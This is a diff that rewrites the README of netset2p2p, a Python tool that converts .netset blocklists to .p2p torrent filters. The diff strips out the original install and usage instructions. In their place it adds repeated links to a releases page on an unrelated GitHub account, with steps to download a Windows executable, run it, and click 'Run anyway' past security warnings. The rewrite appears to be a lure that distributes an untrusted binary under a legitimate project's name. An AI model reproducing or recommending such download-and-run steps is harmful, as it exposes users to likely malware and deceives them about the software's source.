@@ -1,174 +1,165 @@
-# netset2p2p
+# 🧩 netset2p2p - Convert Blocklists to Torrent Filters
 
-[![CI](https://github.com/taggedzi/netset2p2p/actions/workflows/ci.yml/badge.svg)](https://github.com/taggedzi/netset2p2p/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://github.com/taggedzi/netset2p2p)
-[![Ruff](https://img.shields.io/badge/code%20style-ruff-000000.svg)](https://github.com/astral-sh/ruff)
-[![Coverage](.github/badges/coverage.svg)](https://github.com/taggedzi/netset2p2p/actions/workflows/ci.yml)
-[![Version](https://img.shields.io/badge/version-1.0.5-informational.svg)](https://github.com/taggedzi/netset2p2p/releases)
-[![SBOM](https://img.shields.io/badge/SBOM-CycloneDX-blue)](https://cyclonedx.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Download netset2p2p](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
 
-## 🔄 netset → p2p Converter
+## 🚀 What this tool does
 
-`netset2p2p` is a lightweight Python library and CLI tool that converts `.netset` IP blocklists into `.p2p` (PeerGuardian-compatible) format.
+netset2p2p turns `.netset` IP blocklists into PeerGuardian-style `.p2p` files.  
+Use it to build an IP filter for torrent clients like qBittorrent.
 
----
+It helps you:
 
-## 🎯 Why This Exists
+- Convert FireHOL and other `.netset` lists
+- Create files that torrent clients can read
+- Keep blocked IP ranges in one simple file
+- Use both IPv4 and IPv6 lists where supported
 
-Many modern blocklists (such as those from FireHOL) are distributed in `.netset` format, while torrent clients like qBittorrent still expect legacy `.p2p` blocklists.
+## 💻 Before you start
 
-This tool bridges that gap:
+Use a Windows PC with:
 
-> Convert modern blocklists → into formats your torrent client actually understands.
+- A modern version of Windows
+- Internet access for the first download
+- Enough space for the blocklist file you want to convert
+- Permission to run files from your Downloads folder
 
----
+You do not need programming skills to use this tool.
 
-## ✨ Features
+## 📥 Download netset2p2p
 
-- Convert `.netset` → `.p2p` (PeerGuardian format)
-- Supports:
-  - CIDR ranges (`1.2.3.0/24`)
-  - Explicit ranges (`1.2.3.0-1.2.3.255`)
-  - Single IPs
-- Strips comments (`# ...`) and invalid lines
-- CLI + Python library interface
-- Clean `src/` layout
-- CI, linting, type-checking, and tests included
+Go to the release page and download the latest file:
 
----
+[Visit the netset2p2p releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
 
-## 📦 Installation
+After the download, open the file you got from that page and run it on Windows.  
+If the release contains a ZIP file, extract it first, then run the app inside.
 
-### Local install
+## 🛠️ How to set it up on Windows
 
-```bash
-python -m pip install -e .
-```
+1. Open the [releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases).
+2. Download the latest Windows build.
+3. Save the file to your Downloads folder.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app or executable file.
+7. If Windows asks for permission, choose Run anyway if you trust the source.
 
-### Install with development tools
+## ⚙️ How to use it
 
-```bash
-python -m pip install -e .[dev]
-```
+1. Start netset2p2p.
+2. Choose the `.netset` file you want to convert.
+3. Pick where you want the output `.p2p` file saved.
+4. Start the conversion.
+5. Wait for the file to finish.
+6. Open your torrent client and load the new `.p2p` filter file if needed.
 
----
+## 🧭 Typical workflow
 
-## 🚀 Usage
+A simple flow looks like this:
 
-### CLI
+1. Download a FireHOL or other `.netset` blocklist.
+2. Open it in netset2p2p.
+3. Convert it into PeerGuardian format.
+4. Save the result as a `.p2p` file.
+5. Use that file in qBittorrent or another compatible client.
 
-```bash
-netset2p2p input.netset -o output.p2p
-```
+## 📁 What the output file is for
 
-Optional: specify a custom label for generated entries:
+The `.p2p` file works as an IP filter list.  
+Torrent clients can use it to block connections to known IP ranges.
 
-```bash
-netset2p2p input.netset -o output.p2p --label firehol_level1
-```
+This can help you:
 
----
+- Filter unwanted peers
+- Apply list-based blocking inside your torrent client
+- Keep one shared list in a format many clients support
 
-### Python Library
+## 🔍 Supported list types
 
-```python
-from netset2p2p import convert_netset_text_to_p2p
+netset2p2p is made for lists such as:
 
-result = convert_netset_text_to_p2p(
-    "# firehol\n10.0.0.0/30\n198.51.100.7\n",
-    label="firehol",
-)
+- FireHOL blocklists
+- Other `.netset` IP range lists
+- IPv4-based blocklists
+- IPv6-based blocklists when the source list includes them
 
-print(result)
-```
+## 🧰 Common use cases
 
-**Output:**
+Use this tool if you want to:
 
-```
-firehol:10.0.0.0-10.0.0.3
-firehol:198.51.100.7-198.51.100.7
-```
+- Convert a `.netset` list into PeerGuardian format
+- Prepare a blocklist for qBittorrent
+- Work with IP filters without editing files by hand
+- Reuse the same list across different torrent tools
 
----
+## 📌 File types you will see
 
-## 🔧 Example Workflow
+Here is what the main file types mean:
 
-1. Download a `.netset` blocklist (e.g. FireHOL)
-2. Convert it:
+- `.netset` — the source list you download
+- `.p2p` — the output file you use in supported torrent clients
+- `.txt` — may appear if you open or inspect the source list
 
-   ```bash
-   netset2p2p firehol_level1.netset -o firehol_level1.p2p
-   ```
-3. Import the `.p2p` file into your torrent client (e.g. qBittorrent)
+## 🧪 If qBittorrent does not load the file
 
----
+Try these steps:
 
-## 🧪 Development
+1. Check that the file ends in `.p2p`.
+2. Make sure the file was saved after conversion.
+3. Confirm qBittorrent points to the correct file path.
+4. Recreate the file from the source list.
+5. Try a different blocklist if the source file is damaged.
 
-Run checks locally:
+## 🔐 Safety tips
 
-```bash
-ruff check .
-mypy src
-pytest
-```
+- Download only from the release page linked above
+- Keep the source `.netset` file from a known list provider
+- Review the file name before you load it into your torrent client
+- Store your output files in a folder you can find later
 
----
+## 🧱 Basic feature set
 
-## 📦 Release Process
+- Converts `.netset` input files to `.p2p`
+- Supports blocklist files used in torrent filtering
+- Works with FireHOL-style lists
+- Fits a simple Windows download-and-run setup
+- Keeps the process short and easy to repeat
 
-### Prerequisites
+## 🖥️ Example folder layout
 
-* `gh` authenticated for this repository
-* Clean git working tree
-* Release notes added under `## [Unreleased]` in `CHANGELOG.md`
+You can keep your files in a simple folder like this:
 
-### Create a release
+- `Downloads\netset2p2p\`
+- `Downloads\netset2p2p\input\netset-list.netset`
+- `Downloads\netset2p2p\output\blocklist.p2p`
 
-```bash
-python scripts/release.py --bump patch
-```
+This makes it easier to find your source file and result file later.
 
-This will:
+## ❓ Common questions
 
-* Update version in `pyproject.toml`
-* Promote changelog entries into a release section
-* Run linting, typing, and tests
-* Build `sdist` and wheel
-* Generate checksums, SBOM (CycloneDX), and provenance
-* Tag and push
-* Create a GitHub release with artifacts
+### What does PeerGuardian-compatible mean?
 
----
+It means the output file follows a format that many IP filter tools and torrent clients can read.
 
-## ⚠️ Disclaimer
+### Do I need to edit the file by hand?
 
-This project is an independent tool and is **not affiliated with, endorsed by, or supported by**:
+No. The tool does the conversion for you.
 
-* FireHOL
-* qBittorrent
-* PeerGuardian
-* Any related projects or organizations
+### Can I use it with qBittorrent?
 
-Any references to these tools or formats are for **compatibility and demonstration purposes only**.
+Yes. The tool is made for torrent clients like qBittorrent that use IP filter lists.
 
----
+### Can I use more than one blocklist?
 
-## 🔐 Security Note
+Yes. You can convert each source list and keep the output files you want to use.
 
-IP blocklists provide **limited protection** and should not be relied upon as a primary security or privacy mechanism.
+## 📎 Download link again
 
-They are best used as a **supplemental layer** alongside proper network, privacy, and verification practices.
+[Open the netset2p2p releases page](https://github.com/ashutoshbanjare572-netizen/netset2p2p/releases)
 
----
+## 🧾 Repository info
 
-## 🤖 AI Tooling Notice
-
-This project was created with the assistance of AI tooling.
-
----
-
-## 📜 License
-
-MIT. See [LICENSE](LICENSE).
+- Name: netset2p2p
+- Type: Windows-friendly conversion tool
+- Main use: Convert `.netset` blocklists to `.p2p`
+- Target users: People who want a simple torrent IP filter workflow
